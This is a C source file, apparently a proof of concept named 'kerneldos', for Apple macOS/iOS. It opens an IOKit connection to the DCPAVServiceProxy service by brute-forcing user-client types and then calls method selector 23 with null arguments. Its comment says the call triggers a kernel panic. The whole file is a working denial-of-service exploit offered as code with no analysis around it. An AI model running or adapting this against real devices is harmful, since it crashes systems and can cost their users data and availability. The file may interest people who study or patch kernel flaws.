//
//  main.c
//  kerneldos
//
//  Created by Booty Warrior on 4/23/23.
//

#include <stdio.h>
#include <device/device_types.h>
#include <dlfcn.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <IOKit/IOKitLib.h>


//creds https://gist.github.com/vngkv123/1e45264cc450d9de2b33c84b69692444
kern_return_t classForConnection(io_connect_t client, io_name_t cls)
{
    kern_return_t (*mach_port_kobject_description)(mach_port_t, mach_port_t, uint32_t*, mach_vm_address_t*, char*);
    void* handle = dlopen("/usr/lib/system/libsystem_kernel.dylib", RTLD_NOLOAD);
    mach_port_kobject_description = (kern_return_t (*)(mach_port_t, mach_port_t, uint32_t*, mach_vm_address_t*, char*))dlsym(handle, "mach_port_kobject_description");
    if (!mach_port_kobject_description)
        return KERN_NOT_SUPPORTED;

    char desc[512] = {0};
    uint32_t type = 0;
    mach_vm_address_t addr = 0;

    kern_return_t kr = mach_port_kobject_description(mach_task_self(), client, &type, &addr, desc);
    if (kr != KERN_SUCCESS)
        return kr;

    strlcpy(cls, desc, strchr(desc, '(') - desc + 1);
    return KERN_SUCCESS;
}
void kernDOS(io_connect_t connect) {
    //trigger kernel panic
    IOConnectCallMethod((mach_port_t)connect, 23, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0);
}

void setup(void) {
    kern_return_t kr;
    io_iterator_t iterator = IO_OBJECT_NULL;
    kr = IOServiceGetMatchingServices(kIOMainPortDefault, IOServiceMatching("DCPAVServiceProxy"), &iterator);
    io_service_t service = IOIteratorNext(iterator);
    if (service == IO_OBJECT_NULL) {
        return;
    }
    io_name_t class_name = {};
    IOObjectGetClass(service, class_name);
    uint64_t entry_id = 0;
    IORegistryEntryGetRegistryEntryID(service, &entry_id);
    printf("[=] %s 0x%llx  ", class_name, entry_id);

    io_connect_t connect = MACH_PORT_NULL;
    for (uint32_t type = 0; type < 0x1000; type++) {
        kr = IOServiceOpen(service, mach_task_self(), type, &connect);
        if (kr == KERN_SUCCESS) {
            goto can_open;
        }
    }
    for (uint32_t type = 0xffffff80; type != 0; type++) {
        kr = IOServiceOpen(service, mach_task_self(), type, &connect);
        if (kr == KERN_SUCCESS) {
            goto can_open;
        }
    }
    uint32_t types[] = { 0x61736864, 0x484944, 0x99000002, 0xFF000001, 0x64506950, 0x6C506950, 0x88994242, 0x48494446, 0x48494444, 0x57694669 };
    uint32_t count = sizeof(types) / sizeof(types[0]);
    for (uint32_t type_idx = 0; type_idx < count; type_idx++) {
        uint32_t type = types[type_idx];
        kr = IOServiceOpen(service, mach_task_self(), type, &connect);
        if (kr == KERN_SUCCESS) {
            goto can_open;
        }
    }
    goto next;
    
    can_open: {
        classForConnection(connect, class_name);
        printf("\t[+] classForConnection : %s\n", class_name);
        kernDOS(connect);
        return;
    }
    next:{
        printf("Couldn't open connection :(");
        return;
    }
    
}


int main(void) {
    setup();
    return 0;
}

